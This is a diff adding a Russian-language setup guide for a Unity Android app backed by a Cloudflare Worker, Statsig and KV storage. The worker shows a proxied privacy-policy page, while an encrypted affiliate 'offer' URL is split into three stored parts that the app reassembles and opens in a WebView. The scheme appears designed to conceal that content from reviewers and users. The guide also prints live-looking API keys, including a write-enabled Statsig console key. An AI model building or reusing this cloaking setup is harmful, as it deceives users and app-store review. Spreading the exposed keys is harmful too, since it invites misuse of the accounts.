@@ -1,0 +1,173 @@
+Пошаговый сетап. Воркер режет оффер на 3 части и только потом отдаёт 200.
+Клиент после 200 всегда читает Cloud Save + Statsig (или KV, если Statsig пуст) + KV, склеивает, открывает WebView.
+SDK-ключи клиента — только из Unity Remote Config, не из APK.
+
+Воркер: steep-cake-7517
+Домен: https://pebbles5ikfd.xyz/
+UGS environment: production
+
+ConfigCat НЕ используем. У него лимит 4 targeting rules на флаг — это сегменты,
+не хранилище на каждого игрока.
+
+Часть 3 всегда в Cloudflare KV (ключ c:{PlayerId}).
+Часть 2: сначала Statsig; если Statsig переполнен или не записался — та же KV (ключ b:{PlayerId}).
+Клиент: сначала Statsig, если пусто — GET /b из KV.
+
+
+════════════════════════════════
+A) Unity Remote Config
+════════════════════════════════
+Unity Dashboard → проект → Remote Config → environment production.
+
+Ключ            Тип       Откуда брать
+page.href       string    Одна строка через |  без пробелов:
+                          PAGE|STATSIG
+
+                          1) PAGE     — URL политики НА ДОМЕНЕ ВОРКЕРА
+                             (не privacypolicies.com).
+                             Пример: https://pebbles5ikfd.xyz/
+                             Клиент берёт origin этого URL и шлёт туда POST /
+                             и GET /b /c. Отдельного worker.href в приложении нет.
+                          2) STATSIG  — Client API Key (client-...)  client-m9gEswBxrAUKV1V3WsQ0PlEiuXj2sN8tC1fjQ46OzqQ
+
+                          Пример:
+                          https://pebbles5ikfd.xyz/|client-....
+
+worker.href и statsig.sdk удалить, если ещё лежат.
+
+После правок обязательно Publish.
+
+Важно: если PAGE оставить на privacypolicies.com, POST уйдёт не на воркер
+и цепочка сломается. Политика отдаётся с домена воркера (GET / проксирует
+настоящую страницу из секрета PAGE_HREF).
+
+
+════════════════════════════════
+B) Statsig  https://console.statsig.com
+════════════════════════════════
+
+1. Dynamic Config
+   Feature Gates / Dynamic Configs → Create.
+   Имя строго: offer_b
+   ID Type: User ID
+   Enabled: включён
+   Default value JSON: { "p": "" }
+   Targeting rules руками НЕ добавляй. Воркер сам пишет rule на PlayerId.
+
+2. Client SDK Key  →  третья часть page.href (после второго |)
+   Project Settings → Keys & Environments → Client API Keys.
+   Вид: client-...
+   В секреты воркера НЕ клади.
+
+3. Console API Key  →  Cloudflare  STATSIG_CONSOLE_KEY
+   Keys & Environments → Generate New Key.
+   Key Type: Console
+   Make Read Only: НЕ ставить (нужна запись)
+   Can Access Keys: НЕ ставить
+   Create → сразу скопировать (потом не покажут).  console-0d18SZfalrog4TZIQcq7CpxLdkrLUerD2liBcUUzWKv
+   Это НЕ Server Secret Key (secret-...). Server secret воркеру не подходит. 
+
+4. Лимит Statsig: JSON конфига до ~100 КБ (сотни игроков).
+   Воркер всегда дублирует часть 2 в KV (b:{PlayerId}).
+   Если Statsig write падает — 200 всё равно, часть 2 берётся из KV.
+   Клиент: Statsig → если пусто, GET /b. В Desk будет: statsig miss, used kv.
+
+
+════════════════════════════════
+C) Cloudflare KV  (часть 3 + запас части 2)
+════════════════════════════════
+Один ключ = один PlayerId. Лимита «4 игрока» нет.
+  c:{PlayerId}  часть 3
+  b:{PlayerId}  часть 2 (дубль / запас, если Statsig переполнен)
+
+1. Cloudflare Dashboard → Workers & Pages → steep-cake-7517.
+
+2. Settings → Bindings → Add → KV Namespace.
+
+3. Variable name  строго:  OFFER_C
+   (так обращается воркер. Другое имя — будет kv skip и 502.)
+
+4. Namespace:
+   Create a namespace → имя например pebbles-offer-c → Add.
+
+5. Save / Deploy binding.
+
+6. Вставь актуальный DeskHost.js → Save and Deploy.
+
+Секреты CONFIGCAT_AUTH / ENV_ID / SETTING_ID больше не нужны.
+
+
+════════════════════════════════
+D) Cloudflare Worker secrets
+════════════════════════════════
+Workers → steep-cake-7517 (домен pebbles5ikfd.xyz)
+Settings → Variables and Secrets.
+
+Имя                    Откуда
+CLICK_KEY              ключ клика / партнёрки
+NOTE_KEY               ключ нотификаций 73bcf638be7f5e6e3d2bea45852d3b5f22cf0ffd14706051a88a45c548e5f526
+PAGE_HREF              настоящий URL политики (privacypolicies.com/live/...).
+                       Воркер сам качает HTML отсюда (и для шифра, и для GET /).
+                       Это НЕ то же самое что page.href в Remote Config.
+STATSIG_CONSOLE_KEY    Statsig Console API Key (шаг B3)
+STATSIG_CONFIG         можно не ставить, по умолчанию offer_b
+
+Плюс binding OFFER_C из шага C (это не Secret, это KV binding).
+
+Потом вставь актуальный DeskHost.js → Save / Deploy.
+
+
+════════════════════════════════
+E) Как едет в рантайме
+════════════════════════════════
+1. Unity: UGS init + anonymous login.
+2. Remote Config: только page.href (https://pebbles5ikfd.xyz/|client-...).
+3. GET page.href → HTML политики (воркер проксирует PAGE_HREF).
+   POST на origin этой страницы (/).
+   IP берёт Cloudflare (CF-Connecting-IP), клиент ipify не зовёт.
+4. Воркер:
+   • в Cloud Save уже оффер/блок → сразу 200, клик не шлёт;
+   • пусто → гейт/клик, шифрует URL, режет на 3 части:
+        Statsig offer_b     = часть 2 (rule на PlayerId), плюс дубль KV b:{PlayerId}
+        KV OFFER_C          = часть 3 (ключ c:{PlayerId})
+        Cloud Save tut_hint = часть 1, tut_day = "1"
+     Часть 2 ок, если записался Statsig ИЛИ KV b. Часть 3 — только KV c.
+     200 только если часть 2 и часть 3 и Cloud Save ок. Иначе 502.
+     Cloud Save пишется последним: если KV/Statsig упали, повтор POST / сможет дописать.
+5. После 200 Unity всегда:
+   Cloud Save
+   + Statsig (userID=PlayerId); если пусто → GET /b (KV)
+   + GET /c (KV)
+   склеивает, открывает WebView.
+   tut_day=0 → меню.
+
+
+════════════════════════════════
+F) Проверка
+════════════════════════════════
+Desk:
+  page.href set
+  sdk set
+
+Cloudflare logs при успехе:
+  statsig write 201   (или 200)  — если переполнен, будет fail, это ок
+  kv write b ok
+  kv write c ok
+  write store=split cloudsave+statsig+kv-c
+  или  write store=split cloudsave+kv-b+kv-c   (Statsig не записался)
+
+Если 502:
+  statsig get/write fail  и  kv write b fail  → часть 2 нигде не легла
+  kv skip / kv write c fail → нет binding OFFER_C или put части 3 не прошёл
+  split write incomplete  → смотри sig / kvb / kvc
+
+Desk при запасе Statsig:
+  statsig miss, used kv
+
+
+════════════════════════════════
+G) Если сплит уже падал на этом игроке
+════════════════════════════════
+Сотри у этого PlayerId ключи Cloud Save: tut_hint, tut_day
+(или новый анонимный логин / переустановка) и зайди снова.
+Нужна новая Android-сборка: клиент теперь читает GET /c, не ConfigCat.
